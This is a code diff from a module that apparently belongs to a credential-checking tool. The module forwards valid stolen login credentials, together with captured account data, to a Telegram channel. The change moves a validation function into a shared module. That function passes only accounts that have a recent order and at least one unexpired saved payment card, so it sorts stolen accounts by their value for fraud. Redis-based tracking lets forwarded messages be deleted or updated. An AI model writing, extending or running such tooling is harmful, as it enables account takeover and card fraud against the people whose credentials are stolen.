@@ -3,8 +3,13 @@
  * CHANNEL FORWARDER - Forward VALID credentials to Telegram channel
  * =============================================================================
  * 
- * Sends VALID credentials (with capture data) to a configured Telegram channel.
- * Includes tracking code for message management (delete on INVALID, update on BLOCKED).
+ * Handles coordinator-originated channel forwarding (from .chk, combine batch).
+ * Uses the same Redis key scheme (msg:, msg:cred:, fwd:) as the distributed
+ * coordinator ChannelForwarder (src/coordinator/ChannelForwarder.js), ensuring
+ * cross-path interoperability for dedup and status updates.
+ * 
+ * Worker-originated forwards go through a separate path:
+ *   worker → publish forward_event → coordinator ChannelForwarder handles
  * 
  * =============================================================================
  */
@@ -16,6 +21,7 @@ const {
   getMessageRefByCredentials,
   deleteMessageRef,
 } = require('./messageTracker');
+const { validateCaptureForForwarding } = require('../shared/capture/validateCaptureForForwarding');
 const { escapeV2, codeV2, boldV2 } = require('./messages/helpers');
 const { createLogger } = require('../shared/logger');
 const { getConfigService } = require('../shared/config/configService');
@@ -48,50 +54,6 @@ function getChannelId() {
  */
 function isForwardingEnabled() {
   return getChannelId() !== null;
-}
-
-/**
- * Check if capture data meets forwarding requirements.
- * Requires: latest order (not 'n/a') AND at least one card captured.
- * 
- * @param {Object} capture - Capture data from captureAccountData()
- * @returns {{ valid: boolean, reason: string }} Validation result
- */
-function validateCaptureForForwarding(capture) {
-  if (!capture) {
-    return { valid: false, reason: 'no capture data' };
-  }
-  
-  // Check for latest order (not 'n/a')
-  if (!capture.latestOrder || capture.latestOrder === 'n/a') {
-    return { valid: false, reason: 'no latest order' };
-  }
-  
-  // Check for card data (profile must exist with cards array)
-  if (!capture.profile) {
-    return { valid: false, reason: 'no profile data' };
-  }
-  
-  if (!capture.profile.cards || capture.profile.cards.length === 0) {
-    return { valid: false, reason: 'no cards captured' };
-  }
-
-  // Require at least one unexpired card
-  const hasUnexpiredCard = capture.profile.cards.some((card) => {
-    if (!card || !card.expiry) return false;
-    const [mm, yy] = String(card.expiry).split(/[\/\-]/);
-    const month = Number(mm);
-    const year = yy ? Number(yy.length === 2 ? `20${yy}` : yy) : NaN;
-    if (!month || month < 1 || month > 12 || !year) return false;
-    const expiryDate = new Date(year, month, 0); // last day of month
-    return expiryDate >= new Date();
-  });
-
-  if (!hasUnexpiredCard) {
-    return { valid: false, reason: 'all cards expired or missing expiry' };
-  }
-  
-  return { valid: true, reason: '' };
 }
 
 /**
@@ -277,5 +239,4 @@ module.exports = {
   handleCredentialStatusChange,
   isForwardingEnabled,
   getChannelId,
-  validateCaptureForForwarding,
 };
